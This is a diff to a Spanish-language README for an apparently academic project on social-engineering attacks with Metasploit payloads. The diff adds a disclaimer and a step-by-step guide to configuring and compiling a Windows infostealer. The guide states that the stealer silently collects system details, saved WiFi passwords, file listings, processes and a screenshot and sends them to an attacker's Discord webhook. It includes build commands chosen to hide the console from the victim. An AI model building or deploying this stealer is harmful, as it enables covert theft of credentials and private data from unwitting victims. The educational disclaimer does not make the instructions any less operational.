@@ -1,5 +1,7 @@
 # Proyecto Grupo 4 - Generación de Payload con Evasión de Antivirus e Ingeniería Social
 
+> **Educational purposes only.** Este repositorio fue creado como proyecto académico para la materia de Seguridad Informática. Todo el contenido tiene como único objetivo demostrar conceptos de ciberseguridad ofensiva en un entorno controlado y con autorización explícita. No usar contra sistemas sin permiso escrito del propietario.
+
 Este proyecto demuestra el flujo completo de un ataque de ingeniería social usando Metasploit. Se genera un archivo malicioso, se disfraza para que parezca legítimo, se envía a la víctima mediante correo o red social, y una vez que lo ejecuta se obtiene acceso completo al sistema para extraer la información requerida. Todo se hace desde Kali Linux.
 
 ---
@@ -474,6 +476,67 @@ ping IP_TUYA
 Ejecutado desde la máquina víctima.
 
 Si estás usando ngrok y la sesión se cae, es posible que ngrok haya restablecido el túnel y el puerto cambió. Hay que generar un nuevo payload con el nuevo puerto que asignó ngrok.
+
+---
+
+## Paso 11 - Compilar y probar el stealer standalone
+
+El archivo `stealer.cpp` es un programa independiente que no necesita Metasploit ni listener. Cuando la víctima lo abre, en silencio recopila toda la información del sistema y la manda directo a un canal de Discord mediante un webhook. Es perfecto para probar antes de la expo porque ves los datos llegar en tiempo real en tu teléfono o pantalla mientras alguien lo ejecuta.
+
+Lo que hace el stealer cuando alguien lo abre:
+
+Recopila el nombre del equipo, el nombre del usuario, la versión del sistema operativo, la arquitectura del procesador y la RAM total. Obtiene el SID completo del usuario. Lista todos los archivos y carpetas del directorio donde se ejecutó el programa. Extrae las contraseñas de todas las redes WiFi que la máquina tiene guardadas. Lista los primeros veinte procesos corriendo en el sistema. Y al final toma una captura de pantalla de lo que está viendo la víctima y la sube como imagen al canal de Discord.
+
+Todo eso llega a tu Discord en cuestión de segundos sin que la víctima vea nada.
+
+Para compilarlo necesitas estar dentro de Kali y tener mingw instalado, que es el compilador que convierte código C++ de Linux en ejecutables de Windows:
+
+```
+sudo apt-get install mingw-w64
+```
+
+Antes de compilar, abre el archivo y cambia la línea del webhook por el tuyo:
+
+```
+nano stealer.cpp
+```
+
+Busca estas dos líneas cerca del principio:
+
+```
+const std::wstring WEBHOOK_HOST = L"discord.com";
+const std::wstring WEBHOOK_PATH = L"/api/webhooks/TU_WEBHOOK_ID/TU_WEBHOOK_TOKEN";
+```
+
+Para crear un webhook en Discord: entra a tu servidor, haz clic derecho en cualquier canal de texto, selecciona Editar canal, luego entra a Integraciones, haz clic en Webhooks, y crea uno nuevo. Copia la URL que te da. La URL tiene este formato:
+
+```
+https://discord.com/api/webhooks/1234567890123456789/AbCdEfGhIjKlMnOpQrStUvWxYz
+```
+
+La parte que va después de `discord.com` es lo que pones en `WEBHOOK_PATH`. Quedaría así:
+
+```
+const std::wstring WEBHOOK_PATH = L"/api/webhooks/1234567890123456789/AbCdEfGhIjKlMnOpQrStUvWxYz";
+```
+
+Guardas el archivo con Ctrl+O y sales con Ctrl+X.
+
+Ahora lo compilas:
+
+```
+x86_64-w64-mingw32-g++ stealer.cpp -o stealer.exe \
+  -lwinhttp -lgdi32 -lole32 -loleaut32 -luuid \
+  -static -mwindows
+```
+
+El parámetro `-mwindows` hace que el exe se ejecute sin mostrar ninguna ventana de consola. La víctima no ve absolutamente nada cuando lo abre.
+
+El parámetro `-static` incluye todas las librerías necesarias dentro del exe para que funcione en cualquier Windows sin necesitar instalar nada adicional.
+
+Si la compilación termina sin errores, el archivo `stealer.exe` quedó listo en el mismo directorio. Pásalo a una máquina Windows para probarlo. En cuanto lo abras, en tu canal de Discord aparecen los mensajes con toda la información.
+
+Para probarlo en el mismo Kali usando una máquina virtual de Windows, primero copia el exe a una carpeta compartida o súbelo temporalmente a cualquier servicio de archivos, luego lo bajas en la VM y lo ejecutas. Si configuraste el webhook correctamente, los datos llegan en segundos.
 
 ---
 
